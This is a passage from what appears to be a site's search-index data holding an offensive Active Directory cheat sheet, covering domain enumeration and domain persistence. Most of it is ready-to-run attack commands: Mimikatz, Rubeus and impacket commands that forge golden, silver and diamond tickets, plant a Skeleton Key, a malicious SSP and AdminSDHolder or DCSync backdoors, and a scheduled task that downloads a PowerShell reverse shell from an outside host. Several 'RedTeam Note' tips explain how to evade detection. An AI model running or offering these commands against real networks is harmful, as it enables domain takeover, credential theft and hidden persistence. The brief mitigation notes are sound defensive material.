PowerView: Find-UserField -SearchField Description -SearchTerm \"built\" ADModule: Get-ADUser -Filter 'Description -like \"*built*\"' -Properties Description | select name,Description Computers in the domain PowerView: Get-NetComputer Get-NetComputer -OperatingSystem \"*Server 2016*\" Get-NetComputer -Ping Get-NetComputer -FullData PowerView (dev): Get-DomainComputer Get-DomainComputer -Properties DnsHostName ADModule: Get-ADComputer -Filter * | select Name Get-ADComputer -Filter 'OperatingSystem -like \"*Server 2016*\"' -Properties OperatingSystem | select Name,OperatingSystem Get-ADComputer -Filter * -Properties DNSHostname | %{Test-Connection -Count 1 -ComputerName $_.DNSHostName} Get-ADComputer -Filter * -Properties * Domain Groups PowerView: Get-NetGroup Get-NetGroup -Domain &lt;targetdomain&gt; Get-NetGroup -FullData Note: It is also possible search for all groups containing a word: Get-NetGroup *admin* PowerView (dev): Get-DomainGroup Get-Domain | where Name -like \"*Admins*\" ADModule: Get-ADGroup -Filter * | select Name Get-ADGroup -Filter * -Properties * Note: It is also possible search for all groups containing a word: Get-ADGroup -Filter 'Name -like \"*admin*\"' | select Name Find memberships PowerView: Get-NetGroupMember -GroupName \"Domain Admins\" -Recurse Get-NetGroup -UserName \"username\" PowerView (dev): Get-DomainGroupMember -Identity \"Domain Admins\" ADModule: Get-ADGroupMember -Identity \"Domain Admins\" -Recursive Get-ADPrincipalGroupMembership -Identity username Local Groups To do that task needs administrator privs on non-dc machines. PowerView: Get-NetLocalGroup -ComputerName dc01.corp.local -ListGroups Get-NetLocalGroup -ComputerName filesrv1.corp.local -ListGroups The following command shows the members of all the local groups on a machine. Get-NetLocalGroup -ComputerName filesrv1.corp.local -ListGroups -Recurse Logged Users (User has a session on) Like local groups to do that task needs administrator privs on non-dc machines. PowerView: Get actively logged users on a computer (needs local admin rights on the target) Get-NetLoggedon -ComputerName filesrv1.corp.local Get locally logged users on a computer (needs remote registry on the target (by default)) Get-LoggedonLocal -ComputerName filesrv1.corp.local Get the last logged user on a computer (needs local admin rights and remote registry on the target (by default)) Get-LastLoggedOn -ComputerName filesrv1.corp.local Find important targets Shares PowerView: Invoke-ShareFinder -Verbose Invoke-ShareFinder -ExcludeStandard PowerView (dev): Find-DomainShare Find-DomainShare -CheckShareAccess Sensitive Files PowerView: Invoke-FileFinder -Verbose PowerView (dev): Find-InterestingDomainShareFile -Include *.doc*, *.xls*, *.csv, *.ppt* File servers PowerView: Get-NetFileServer Group Policy (GPO) Group Policy provides the ability to manage configuration and changes easily and centrally in active directory. PowerView: Get-NetGPO Get-NetGPO -ComputerName machine01.corp.local Get-NetGPO Group PowerView (dev): Get-DomainGPO Get-DomainGPO -Properties DisplayName ADModule: Get-GPO -All Get-GPResultantSetOfPolicy -ReportType Html -Path c:\\windows\\temp\\report.html NOTE: We can get more infomration with: gpresult R V Users on Localgroups We can also get users which are in a local group of a machine using GPO. PowerView: Find-GPOComputerAdmin -Computer machine01.corp.local PowerView (dev): Get-DomainGPOLocalGroup | select GPODisplayName, GroupName Or we can find machines where a user is member of a specific group. PowerView: Find-GPOLocation -UserName &lt;user&gt; -Verbose PowerView (dev): Get-DomainGPOUserLocalGroupMapping -LocalGroup Administrators | select objectName, GPODisplayName, ContainerName, ComputerName | fl Organization Unit (OU) PowerView: Get-NetOU -FullData PowerView (dev): Get-DomainOU ADModule: Get-ADOrganizationalUnit -Filter * -Properties * To read which GPO is aplied to each OU, use the gplink value extracted from Get-NetOU. PowerView: Get-NetGPO -GPOname '{FD2B3AF5-356B-ADE4-98C1F4EF8081}' ADModule: Get-GPO -Guid FD2B3AF5-356B-ADE4-98C1F4EF8081 To know which computers are inside a OU: PowerView: Get-NetOU -OUName Students | %{Get-NetComputer -ADSPath $_} PowerView (dev): Get-DomainOU \"Servers\" | %{Get-DomainComputer -SearchBase $_.distinguishedname -properties name} Access Control List (ACL) Enables control on the ability of a process to access objects and other resources in active diectory based on: Access Tokens: Security context of a process which contains the identity and privileges of a user. Security Descriptors: SID of the owner , Discretionary ACL (DACL) and System ACL (SACL). It’s a list of Access Control Entities (ACE) which corresponds to an individual permission or audits access. Determines who has permission and what can be done on an object. Exists two types: DACL: Defines the permissions trustees a user or group have on an object. SACL: Logs sucess and failure audit messages when an object is accessed. ACLs are vital to security architecture of Active Directory. We can list the ACLs associated to a specified object, with a specified prefix, specified LDAP search or to specific path. PowerView: Get-ObjectAcl -SamAccountName &lt;username&gt; -ResolveGUIDs Get-ObjectAcl -ADSprefix 'CN=Administrator,CN=Users' -Verbose Get-ObjectAcl -ADSpath \"LDAP: CN=Domain Admins,CN=Users,DC=corp,DC=local\" -ResolveGUIDS -Verbose Get-PathAcl -Path \"\\\\dc01.corp.local\\sysvol\" ADModule: (Get-Acl 'AD:\\CN=Administrator,CN=Users,DC=corp,DC=local').Access PowerView has a module named ACLScanner that finds interesting ACL such as ACL that are modified or ones which determines where and which object we can modify. PowerView: Invoke-ACLScanner -ResolveGUIDs Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName -match \"RDPUsers\"} Domain Trust Mapping We can get a list of all domain trusts for a domain. PowerView: Get-NetDomainTrust Get-NetDomainTrust -Domain es.lab.corp.local PowerView (dev): Get-DomainTrust ADModule: Get-ADTrust Get-ADTrust -Identity es.lab.corp.local Other: nltest domain_trusts Forest Mapping A Forest is like a tree of domains (domain and subdomains) and the name of the forest is the name as the root domain of the tree. We can get details about a forest: PowerView: Get-NetForest Get-NetForest -Forest extcorp.local ADModule: Get-ADForest Get-ADForest -Identity extcorp.local We can get all domains in a forest: PowerView: Get-NetForestDomain Get-NetForestDomain -Forest extcorp.local ADModule: (Get-ADForest).Domains We can get all global catalogs of a forest: PowerView: Get-NetForestCatalog Get-NetForestCatalog -Forest extcorp.local ADModule: Get-ADForest | select -ExpandProperty GlobalCatalogs We can get the map trusts of a forest: PowerView: Get-NetForestTrust Get-NetForestTrust -Forest extcorp.local ADModule: Get-ADTrust -Filter 'msDS-TrustForestTrustInfo -ne \"$null\"' User Hunting Local Admin Check Find all machines on the current domain where the current user has local admin access. PowerView: Find-LocalAdminAccess -Verbose Note: This function queries the domain controller for a list of computers Get-NetComputer and then use multi-threaded Invoke-CheckLocalAdminAccess on each machine. MAKE A LOT OF NOISE In case Find-PSRemotingLocalAdminAccess.ps1 is blocked you can use: Import-Module .\\Find-WMILocalAdminAccess.ps1 Find-WMILocalAdminAccess -ComputerName machine01.corp.local Find-WMILocalAdminAccess -ComputerFile .\\computers.txt -Verbose NOTE: WMI needs ADMIN PRIV to work, so if we get an error is that the user has not enough privileges. Get Local Admins (Local Admin Priv. needed) We can find local admins on all machines of the domain but we need administrator privileges on non-dc machines. PowerView: Invoke-EnumerateLocalAdmin -Verbose Note: This function queries the DC fo a list of computers Get-NetComputer an then use multi-threaded Get-NetLocalGroup on each machine. MAKE A LOT OF NOISE Sessions opened on a machine Returns session information for a computer where CName is the source IP. PowerView Dev: Get-NetSession -ComputerName dc01.corp.local | select CName, UserName Machines where a User Group has session We can find computers where a domain admin or another specified user or group has an active session: PowerView: Invoke-UserHunter Invoke-UserHunter -GroupName \"RDPUsers\" Invoke-UserHunter -UserName \"john.brown\" Note: This function queries the DC for members of a given group using Get-NetGroupMember, gets a list of computers with Get-NetComputer and list sessions and logged users with Get-NetSession and Get-NetLoggedon from each machine. We can also confirm the admin access with: PowerView: Invoke-UserHunter -CheckAcces We can also find with Invoke-UserHunter where a domain admin is logged-in. PowerView: Invoke-UserHunter -Stealth Note: This option queries the DC for members of the given group using Get-NetGroupMember, gets a list of only of high traffic servers such as DC, File Servers and Distributed File Servers for less traffic generation and list sessions and logged on users with Get-NetSession and Get-NetLoggedon. MAKE NOISE RedTeam Note: To prevent of beeing detected by the Microsoft ATA (Advanced Thread Analytics) that analyzes the traffic of the DC, use a list of computers and remove the DC from it. Get-NetComputer Invoke-UserHunter -ComputerFile hosts.txt BlueTeam Note: Netcease.ps1 is a script which change permission on the NetSessionEnum by removing permission to Authenticated Users group. This Script should be executed on the DC. https: github.com p0w3rsh3ll NetCease. To revert the effect: .\\Netcease.ps1 -Revert After any modfification we need to restart the server: Restart-Service -Name Server -Force The binary net.exe uses SAMR protocol, exists another script which hardens a server. https: vulners.com n0where N0WHERE:139229 SQLServers We can provide a list of all SQL servers which have a SPN register on the domain controller. PowerUPSql Get-SQLInstanceDomain Note: This not mean that is a SQL Server running or listening, that means htat there are a MSSQL on a SPN. BloodHound Provides GUI for AD entities and relationships for the data collected by its ingestors (SharpHound.ps1). https: github.com BloodHoundAD BloodHound First we need to run ingestors on a machine in order to collect data. . .\\SharpHound.ps1 Invoke-BloodHound -CollectionMethod All -Verbose SharpHound has a number of different collection methods (all documented on the repository): Default: Performs group membership collection, domain trust collection, local group collection, session collection, ACL collection, object property collection, and SPN target collection Group: Performs group membership collection LocalAdmin: Performs local admin collection RDP: Performs Remote Desktop Users collection DCOM: Performs Distributed COM Users collection PSRemote: Performs Remote Management Users collection GPOLocalGroup: Performs local admin collection using Group Policy Objects Session: Performs session collection ComputerOnly: Performs local admin, RDP, DCOM and session collection LoggedOn: Performs privileged session collection (requires admin rights on target systems) Trusts: Performs domain trust enumeration ACL: Performs collection of ACLs Container: Performs collection of Containers DcOnly: Performs collection using LDAP only. Includes Group, Trusts, ACL, ObjectProps, Container, and GPOLocalGroup. ObjectProps: Performs Object Properties collection for properties such as LastLogon or PwdLastSet All: Performs all Collection Methods except GPOLocalGroup. Sometimes BloodHound miss to check the sessions so we can execute it manually. Invoke-BloodHound -CollectionMethod LoggedOn -Verbose Note: Remember that we can append the invoke command at the end of the file an executed it out of memory with iex (iwr ...) RedTeam Note: We can avoid detections like ATA with: Invoke-BloodHound -CollectionMethod All -ExcludeDC After execution download the .zip file and drop to BloodHound in order to import it. OPSEC Alert: Running collections method such as LocalAdmin, RDP, DCOM, PSRemote and LoggedOn will allow SharpHound to enumerate every single computer in the domain. Collecting this information is useful to BloodHound and without it you may see fewer paths. To use on LDAP queries we can use DcOnly collection method. Invoke-BloodHound -CollectionMethod DcOnly Raw queries Executing raw queries is useful for finding nodes that have particular properties or to help specific attack paths. Query all users that have Service Principal Name (SPN) set. MATCH (u:User {hasspn:true}) RETURN u Query all users that have Do not require Kerberos preauthenticaion set. MATCH (u:User {dontreqpreauth:true}) RETURN u Query all computers that are AllowedToDelegate. MATCH (c:Computer), (t:Computer), p=((c)-[:AllowedToDelegate]-&gt;(t)) RETURN p Query all computers with Unconstrained Delegation. MATCH (c:Computer {unconstraineddelegation:true}) RETURN c Query all computers with Constrained Delegation. MATCH (c:Computer), (t:Computer), p=((c)-[:AllowedToDelegate]-&gt;(t)) RETURN p Query all users with Constrained Delegation. MATCH (u:User), (t:Computer), p=((u)-[:AllowedToDelegate]-&gt;(t)) RETURN p Query all Principals with GenericWrite over GPOs. MATCH (gr:Group), (gp:GPO), p=((gr)-[:GenericWrite]-&gt;(gp)) RETURN p Query ACL for a specify group: MATCH (g1:Group {name:\"RDP USERS@CORP.LOCAL\"}), (g2:Group), p=((g1)-[:GenericAll]-&gt;(g2)) RETURN p Query potential MS SQL Admins: MATCH p=(u:User)-[:SQLAdmin]-&gt;(c:Computer) RETURN p"
					}

					
				
			
		
			
				
					,
					

					"active-directory-domain-persistence": {
						"id": "active-directory-domain-persistence",
						"title": "Domain Persistence",
						"category": "",
						"url": " /active-directory/domain-persistence/",
						"content": "There is much more in Active Directory than just a Domain Admin. Once we have domain admin privileges new avenues of persistence, escalation to enterprise admin and attacks across trust appears. These are some techniques to make a persistence on a domain. Golden Ticket A golden ticket is signed and encrypted by the hash of krbtgt account which makes it a valid TGT ticket. Since user account validation is not done by the KDC until TGT is older than 20 minutes. So we can use even deleted revoked accounts. To conclude, the krbtgt user hash could be used to impersonate any user with any privileges from even a non-domain machine. First we need to obtain the krbtgt hash: Invoke-Mimikatz -Command '\"lsadump::lsa patch\"' -ComputerName dc.corp.local Invoke-Mimikatz -Command '\"lsadump::dcsync user:corp\\krbtgt\"' RedTeam Note: Using DCSync option does not need code execution on the target DC. For that reason is more silent than dumping the LSA. DCSync is a technique which allows an attacker to hijack the Domain Controller account and replicate data such as passwords of all domain controllers. After that we need to create the ticket. Invoke-Mimikatz Parameter Description user:Administrator Username fot which TGT is generated domain:corp.local Domain FQDN sid:S-1-5-21-268341927-4156873456-1784235843 Domain SID krbtgt:a9b30e5b0dc865eadcea9411e4ade72d NTLM(RC4) hash of the krbtgt account. Use aes128 and aes256 for AES keys. id:500 User RID (default 500) groups:513 Group ID (default 512,513,518,519,520) startoffset:0 Optional - When the ticket is available (Default 0 - right now, -10 - Available since 10minutes ago) endind:600 Optional - The default AD setting is about 10 hours (10h * 60min = 600). renewmax:10080 Optional - Mimikatz by default create a ticket lifetime with 10 years of renewal. Default AD setting is 7 days (7d * 24h * 60min = 10080) Invoke-Mimikatz -Command '\"kerberos::golden User:Administrator domain:corp.local sid:S-1-5-21-268341927-4156873456-1784235843 krbtgt:a9b30e5b0dc865eadcea9411e4ade72d id:500 groups:513 startoffset:0 endin:600 renewmax:10080 ptt\"' Invoke-Mimikatz -Command '\"kerberos::golden User:Administrator domain:corp.local sid:S-1-5-21-268341927-4156873456-1784235843 aes256:390b2fdb13cc820d73ecf2dadddd4c9d76425d4c2156b89ac551efb9d591a8aa id:500 groups:513 startoffset:0 endin:600 renewmax:10080 ticket\"' Note: ptt injects the ticket in current PowerShell process. ticket saves the ticket to a file for later use. RedTeam Note: Avoid detection by creating a ticket with less duration than the maximum in kerberos policy. So create a ticket and inmediately use it. endin:600 Mimikatz by default create a ticket with 10 years of lifetime. renewmax:10080 Mimikatz by default create a ticket lifetime with 10 years of renewal. RedTeam Note: To prevent beeing detected of ATA use the aes256 keys. Invoke-Mimikatz -Command '\"kerberos::golden User:Administrator domain:corp.local sid:S-1-5-21-268341927-4156873456-1784235843 krbtgt:a9b30e5b0dc865eadcea9411e4ade72d id:500 groups:513 startoffset:0 endin:600 renewmax:10080 aes256:&lt;aes256keysofkrbtgt&gt; ptt\"' Rubeus.exe .\\Rubeus.exe golden aes256:&lt;aes256&gt; user:Administrator domain:corp.local sid:S-1-5-21-268341927-4156873456-1784235843 nowrap Ticketer.py (impacket) python ticketer.py -nthash a9b30e5b0dc865eadcea9411e4ade72d -domain-sid S-1-5-21-268341927-4156873456-1784235843 -domain corp.local Administrator export KRB5CCNAME=. administrator.ccache python psexec.py corp.local Administrador@dc01.corp.local -k -no-pass Use klist to list all kerberos tickets: klist With a Golden Ticket we can access to any resource of the domain such as shared files (C$), and execute services and WMI, so we can user psexec or wmiexec to obtain a shell. ls \\\\dc01.corp.local\\c$ Note: A shell via WMI can not be obtained, so do not use PowerShell Remote. In order to execute commands we can do a dcsync attack and once obtained the hash do a over-pass-the-hash. Invoke-Mimikatz -Command '\"lsadump::dcsync user:corp\\Administrator\"' Note DCSync attack can be done on any machine even if it is not part of the domain. Mitigation While creating a golden ticket the attacker creates some events in logs: Event ID 4624: Account Logon Event ID 4672: Admin Logon Get-WinEvent -FilterHashtable @{Logname='Security';ID=4672} -MaxEvents 1 | Format-List -Property * TGT lifetime is not logged in 4769 event, however it can be correlated when a 4769 event appears without a prior 4768 alert. It’s not possible to request a TGS without a TGT, and if there is no record of a TGT being issued, we can assume that has been crafted offline. Other trick that defenders do is alert on 4769 for sensitive users such as default administrator account. https: www.ired.team offensive-security-experiments active-directory-kerberos-abuse kerberos-golden-tickets https: book.hacktricks.xyz windows active-directory-methodology golden-ticket Silver Ticket A Silver Ticket is a valid TGS which is encrypted and signed by the NTLM hash of the service account like the Machine account hash (DC01$). The TGS will allow access only to the service requested. This technique is a reasonable persistence because the ticket would be valid for 30 days in computer accounts (default). We are going to target the domain controller machine account. First we need the DC machine account hash. Invoke-Mimikatz -Command '\"lsadump::lsa patch\"' -ComputerName dc01 After that we need to create the ticket. Invoke-Mimikatz Parameter Description user:Administrator Username fot which TGS is generated domain:corp.local Domain FQDN sid:S-1-5-21-268341927-4156873456-1784235843 Domain SID target:dc.corp.local Target server FQDN service:CIFS The SPN name of the service for which TGS will be created rc4:6f5b5acaf6744d567ac55e67ff22 NTLM(RC4) hash of the machine account (DC01$). Use aes128 and aes256 for using AES keys id:500 User RID (default 500) groups:513 Group ID (default 512,513,518,519,520) Invoke-Mimikatz -Command '\"kerberos::golden domain:corp.local sid:S-1-5-21-268341927-4156873456-1784235843 target:dc.corp.local service:CIFS rc4:6f5b5acaf6744d567ac55e67ff22 user:Administrator id:500 groups:512 ptt\"' Invoke-Mimikatz -Command '\"kerberos::golden domain:corp.local sid:S-1-5-21-268341927-4156873456-1784235843 target:dc.corp.local service:CIFS aes256:390b2fdb13cc820d73ecf2dadddd4c9d76425d4c2156b89ac551efb9d591a8aa user:Administrator id:500 groups:512 ptt\"' Note: ptt injects the ticket in current PowerShell process. ticket saves the ticket to a file for later use. Note: Similar command can be used for any other service on a machine: CIFS, HOST, RPCSS, WSMAN… Finally we can list the content of File System (In that case because we forged a Ticket for CIFS service on the DC). Rubeus .\\Rubeus.exe silver service:cifs dc-01.corp.local aes256:&lt;aes256keys&gt; user:Administrator domain:corp.local sid:S-1-5-21-268341927-4156873456-1784235843 nowrap ls \\\\dc.corp.local\\c$ This table shows the available services: Service Type Service Silver Ticket WMI HOST RPCSS PowerShell Remoting HOST HTTP And Maybe: WSMAN RPCSS WinRM HOST HTTP And Maybe: WINRM Scheduled Tasks HOST Windows File Sharing CIFS PsExec CIFS LDAP operations, DCSync LDAP Windows Remote Server Administration Tools RPCSS LDAP CIFS Golden Tickets krbtgt There are many ways of achieve command executing using Silver Ticket. Schedule and Execute a task We just need to create a ticket for the HOST SPN which will allow us to schedule a task on the target. And then schedule and execute a task. schtasks create S dc01.corp.local SC Weekly RU \"NT Authority\\SYSTEM\" TN \"STCheck\" TR \"powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString('''http: 10.10.10.10 Invoke-PowerShellTcp.ps1''')'\" schtasks Run S dc01.corp.local TN \"STCheck\" Note: Create a new schtask with different TN name for every try. Execute WMI queries To execute WMI queries we just need to create a ticket for the HOST and RPCSS. Get-WmiObject -Class win32_operatingsystem -ComputerName $Computer Invoke-WmiMethod win32_process -ComputerName $Computer -Name create -ArgumentList \"$RunCommand\" wmic dc01.corp.local list full format:list wmic node:target-computer-name process call create “cmd.exe c task-name” There are several scripts such as WmiSploit that helps to create a shell or execute commands on a target (similar to PSRemoting but with WMI). Enter-WmiShell -ComputerName dc01.corp.local -UserName user Invoke-WmiCommand -ComputerName dc01.corp.local -Credential $cred -ScriptBlock {whoami} Note Import both modules Enter-WmiShell.ps1 and Invoke-WmiCommand are used. https: github.com secabstraction WmiSploit PsExec To run commands on other machine with PsExec we just need to create a ticket for CIFS and HOST service. .\\PsExec.exe -accepteula \\\\dc01.corp.local cmd PowerShell Remote With winrm access over a computer you can access it with PowerShell Remote. A ticket with HOST and WSMAN is needed. $sess = New-PSSession -ComputerName dc01.corp.local Enter-PSSession -Session $sess Dump DC database with DCSync We can dump DC database using DCSync by crafting a silver ticket with the LDAP SPN. Invoke-Mimikatz -Command '\"lsadump::dcsync dc:dc01.corp.local domain:corp.local user:krbtgt\"' Mitigation While creating a silver ticket the attacker creates some events in logs: Event ID 4624: Account Logon Event ID 4634: Account Logoff Event ID 4672: Admin Logon Get-WinEvent -FilterHashtable @{Logname='Security';ID=4672} -MaxEvents 1 | Format-List -Property * RedTeam Note: Silver Ticket is very hard to be detected. Diamond Ticket A golden ticket is forged completely offline, encrypted with the krbtgt hash, and then passed into a logon session for use. Because DCs don’t track if a TGT have been legitimately issued,they will accept TGTs that are encrypted with its own krbtgt hash. Like a golden ticket, a diamond ticket can be used to access any services as any user. A diamond ticket is made by modifying the fields of a legitimate TGT that was issued by a DC. This is achieved by requesting a TGT, decrypting it with the domain’s krbtgt hash, modifying the desired fields of the ticket, then re-encrypting it. So: TGS-REQs will have a preceding AS-REQ. The TGT was issued by DC which means it will have all the correct details from the domain’s kerberos policy. OPSEC Alert Diamond Ticket is more silent than Golden Ticket. .\\Rubeus.exe diamond tgtdeleg ticketuser:jdoe ticketuserid:1106 gorups:512 krbkey:390b2fdb13cc820d73ecf2dadddd4c9d76425d4c2156b89ac551efb9d591a8aa nowrap Parameter Description tgtdeleg Uses the Kerberos GSS-API to obtain a useable TGT for the user. ticketuser Username to impersonate ticketuserid Domain RID of that principal. Can be obtained with: Get-DomainUser -Identity jdoe -Properties objectsid groups Desired group RID (512 - Domain Admins). krbkey krbtgt AES256 hash We can check that the TGT has been modified with describe: .\\Rubeus.exe describe ticket:doIFYj[...snip...]MuSU8= Skeleton Key Skeleton Key is a persistence technique where it is possible to patch a Domain Controller (lsass process) so that it allows access as any user with a single password. The attack was discovered by Dell Secureworks used in a malware named the Skeleton Key Malware. All the publicly known methods are NOT persistent across reboots. RedTeam Notes: Its not probably that a enterprise reboot the DC or kill lsass process. To execute this technique domain admin privilegs are required. Invoke-Mimikatz -Command '\"privilege::debug\" \"misc::skeleton\"' -ComputerName dc01.corp.local So it is possible to access any machine with a valid username and mimikatz as password. Enter-PSSession -ComputerName dc01.corp.local -Credential corp\\Administrator Note: In the skeleton key attack both passwords work at the same time, the actual password and mimikatz as password. In case lsass is running as a protected process, we can still use Skeleton Key but it needs the mimikatz driver mimidriv.sys on disk of the target dc. Be careful this would be very noisy in logs. mimikatz# privilege::debug mimikatz# !+ mimikatz# !processprotect process:lsass.exe remove mimikatz# misc::skeleton mimikatz# !- mimikatz# !misc::skeleton The DC can not be patched twice. Mitigation We can detect the Skeleton Key attack looking the events in logs. System Event ID 7045: A service was installed in the system Security Event ID 4673: Sensitive Privilege Use Event ID 4611: A trusted logon process has been registered with the Local Security Authority Get-WinEvent -FilterHashtable @{Logname='System';ID=7045} | ?{$_.message -like \"*Kernel Mode Driver*\"} # Not recommended, detects only stock mimidrv Get-WinEvent -FilterHashtable @{Logname='System';ID=7045} | ?{$_.message -like \"*Kernel Mode Driver*\"} -and $_.message -like \"*mimidrv*\"} RedTeam Note: This attack is very noisy. We can also mitigate that running lsass.exe as a protected process that forces the attacker to load a kernel mode driver. Net-ItemProperty HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\ -Name RunAsPPL -Value 1 -Verbose Verify after a reboot: Get-WmiEvent -FilterHashtable @{Logname='System';ID=12} | ?{$_.message -like \"*protected process*\"} Directory Services Restore Mode (DSRM) There is a local administrator on every domain controlled called “Administrator” whose password is the DSRM password. DSRM password (SafeModePassword) is required when a server is promoted to Domain Controller and it is rarely changed. We only need to dump the DSRM password: Invoke-Mimikatz -Command '\"token::elevate\" \"lsadump::sam\"' -ComputerName dc01 We can compare the Administrator hash with the Administrator hash with the following command: Invoke-Mimikatz -Command '\"lsadump::lsa patch\"' -ComputerName dc01 Since we have the NTLM hash, we can pass the hash to authenticate. But, the Logon Behaviour for the DSRM account needs to be changed before we can use its hash. Enter-PSSession -ComputerName dc01 [corp-dc]: PS C:\\Users\\Administrator\\Documents&gt; New-ItemProperty \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\\" -Name \"DsrmAdminLogonBehavior\" -Value 2 -PropertyType DWORD DsrmAdminLogonBehavior : 2 PSPath : Microsoft.PowerShell.Core\\Registry::HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\ PSParentPath : Microsoft.PowerShell.Core\\Registry::HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control PSChildName : Lsa PSDrive : HKLM PSProvider : Microsoft.PowerShell.Core\\Registry Note: If we get an error such as “New-ItemProperty: The property already exists” you need to modify it. Get-ItemProperty \"HKLM:\\System\\CurrentControlSet\\Control\\Lsa\\\" Set-ItemProperty \"HKLM:\\System\\CurrentControlSet\\Control\\Lsa\\\" -Name \"DsrmAdminLogonBehavior\" -Value 2 Over PassTheHash Invoke-Mimikatz -Command '\"sekurlsa::pth domain:dc01 user:Administrator ntlm:a9b30e5b0dc865eadcea9411e4ade72d run:powershell.exe' PsExec.exe accepeula \\\\dc01.corp.local powershell Note: Is not possible to connect via PSRemote, so use PsExec instead. Mitigation Look the logs: Event ID 4657: Audit creation change of HKLM:\\System\\CurrentControlSet\\Control\\Lsa\\DsrmAdminLogonBehavior Get-WinEvent -FilterHashtable @{Logname='System';ID=4657} | ?{$_.message -like \"*Kernel Mode Driver*\"} Custom Security Support Provider (SSP) A security support provider is a dll which provides ways for an application to obtain an authenticated connection. Some SSP packages by microsoft are NTLM, kerberos, CredSSP… Mimikatz provides a custom SSP named mimilib.dll. This SSP logs everly local logon, service account and machine account in plain text on the target server. We can abuse in two different ways: Dropping the mimilib.dll to system32 and add mimilib to HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Security Packages: $packages = Get-ItemProperty HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\OSConfig\\ -Name 'Security Packages' | select -ExpandProperty 'Security Packages' $packages += \"mimilib\" Set-ItemProperty HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\OSConfig\\ -Name 'Security Packages' -Value $packages Set-ItemProperty HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\ -Name 'Security Packages' -Value $packages Inject into lsass using mimikatz (not stable with Server 2016): Invoke-Mimikatz -Command '\"misc::memssp\"' All local logons on the domain controller are logged to C:\\Windows\\system32\\kiwissp.log. Mitigation Look the logs: Event ID 4657: Audit creation change of HKLM:\\System\\CurrentControlSet\\Control\\Lsa\\SecurityPackages Get-WinEvent -FilterHashtable @{Logname='System';ID=4657} | ?{$_.message -like \"*Kernel Mode Driver*\"} AdminSDHolder Resides in the system container of a domain and used to control the permissions using an ACL for certain built-in privileged groups which are called the protected groups. Security Descriptor Propagator (SDPROP) runs every hour and compares the ACL of protected groups and members with the ACL of AdminSDHolder and any differences are overwritten on the object ACL. List of protected groups and how can be abused some of them can log on locally to the domain controller: Account Operators: Can modify nesteg groups. Bakup Operators: Backup GPO, edit ato add SID of controller account to a privileged gorup and restore. Server Operators: Run a command as system Print Operators: Copy ntds.dit backup, load device drivers. Domain Admins: Can log on. Replicator: Can log on. Enterprise Admins: Can log on. Domain Controllers: Can log on. Read-only Domain Controllers: Can log on. Schema Admins: Can log on. Administrators: Can log on. With Domain Admin privileges which means that we have full control and write permissions on the AdminSDHolder object, this full control can be abused to create a backdoor or persistence mechanism by adding a user with Full Permissions to the AdminSDHolder object. In 60 minutes when the SDPROP is runned, the user will be added with Full Control access to the ACL of gropus like Domain Admins without actually being a member of it. Fist we need to add full controll permissions fo a user to the AdminSDHolder: PowerView: Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName user1 -Rights All -Verbose PowerView (dev): Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=corp,DC=local' -PrincipalIdentity user1 -Rights All ADModule: Set-ADACL -DistinguishedName 'CN=AdminSDHolder,CN=System,DC=corp,DC=local' -Principal user1 -Verbose Note: Other interesing permissions for a user to the AdminSDHolder: ResetPassword, WriteMembers. After 60 minutes the ACL will be propagated automatically to the domain. It can be also posible to propagate it manually with Invoke-SDPropatagor.ps1 $sess = New-PSSession -ComputerName dc01.corp.local Invoke-Command -FilePath .\\Invoke-SDPropagator.ps1 -Session $sess Enter-PSSession -Session $sess And on the DC: Invoke-SDPropagator -timeoutMinutes 1 -showProgress -Verbose To check the Domain Admin Permissions as normal user: PowerView: Get-ObjectACL -SamAccountName \"Domain Admins\" -ResolveGUIDs | ?{$_.IdentityReference -match 'user1'} ADModule: (Get-Acl -Path 'AD:\\CN=Domain Admins,CN=Users,DC=corp,DC=local').Access | ?{$_.IdentityReference -match 'user1'} Note: GenericAll means that has FullControl to an object. Finally we just need to abuse it. ACL for Persistence Abusing FullControl ACL PowerView: Add-NetGroupUser -UserName user2 -GroupName \"Domain Admins\" -Domain corp.local ADModule: Add-ADGroupMember -Identity 'Domain Admins' -Members user2 -Verbose Abusing ResetPassword ACL PowerView: Set-DomainUserPassword -Identity user2 -AccountPassword (ConvertTo-SecureString \"Password123!\" -AsPlainText -Force) -Verbose ADModule: Set-ADACcountPassword -Identity user2 -NewPassword (ConvertTo-SecureString \"Password123!\" -AsPlainText -Force) -Verbose ACLs Rights Abuse Abusing FullControl ACL in domain root There are even more intereting ACLs which can be abused. With DA privileges, the ACL for the domain root can be modified to provide useful rights like FullControl. First, add full control rights: PowerView: Add-ObjectAcl -TargetDistinguishedName 'DC=corp,DC=local' -PrincipalSamAccountName user1 -Rights All -Verbose ADModule: Set-ADACL -DistinguishedName 'DC=corp,DC=local' -Principal user1 -Verbose DCSync Backdoor There are even more intereting ACLs which can be abused. With DA privileges, the ACL for the domain root can be modified to provide useful rights like the ability to run DCSync. PowerView: Add-ObjectAcl -TargetDistinguishedName 'DC=corp,DC=local' -PrincipalSamAccountName user1 -Rights DCSync -Verbose PowerView (dev): Add-DomainObjectAcl -TargetIdentity 'DC=corp,DC=local' -PrincipalIdentity user1 -Rights DCSync ADModule: Set-ADACL -DistinguishedName 'DC=corp,DC=local' -Principal user1 -GUIDRight DCSync -Verbose Note: There are three special rights which are required to DCSync: Replicating Directory Changes, Replicating Directory Changes All and Replicating Directory Changes In Filtered Set. And then execute DCSync: Invoke-Mimikatz -Command '\"lsadump::dcsync user:corp\\krbtgt\"' Invoke-Mimikatz -Command '\"lsadump::dcsync user:corp\\Administrator\"' So once we have obtained the hash NTLM of any user of the domain, PassTheHash or Over-PassTheHash attack can be executed. ACL Security Descriptors It is possible to modify Security Descriptors such as security information like owner, primary group, DACL and SACL of multiple remote access methods to allow access to non-admin users. It is a very useful backdoor mechanism but administrative privileges are required. Security Descriptor Definition Language defines the format which is used to describe a security descriptor. SDDL uses ACE strings for DACL and 